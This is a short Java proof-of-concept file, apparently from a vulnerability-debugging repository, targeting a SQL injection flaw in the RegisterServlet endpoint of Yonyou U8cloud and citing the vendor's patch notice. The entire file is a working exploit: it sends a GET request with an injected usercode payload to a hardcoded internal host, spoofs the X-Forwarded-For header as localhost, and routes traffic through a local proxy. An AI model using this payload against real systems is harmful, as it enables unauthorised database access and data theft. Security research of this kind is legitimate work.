package cve;

import com.pacemrc.vuldebug.common.utils.HttpRequest;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.message.BasicHeader;

import java.net.URLEncoder;


/**
 * U8cloud所有版本RegisterServlet接口存在SQL注入漏洞
 * https://security.yonyou.com/#/patchInfo?foreignKey=c024cdc825ea415184caf87aacb68f9c
 */
public class rce2 {


    public static void main(String[] args) throws Exception {

        String url = "http://10.58.120.201:8088/servlet/RegisterServlet?key=caofalin_key&usercode=";
        String params = URLEncoder.encode("1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--");

        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpGet httpGet = new HttpGet(url + params);
        httpGet.addHeader("X-Forwarded-For","127.0.0.1");
        httpRequest.sendGet(httpGet);

    }
}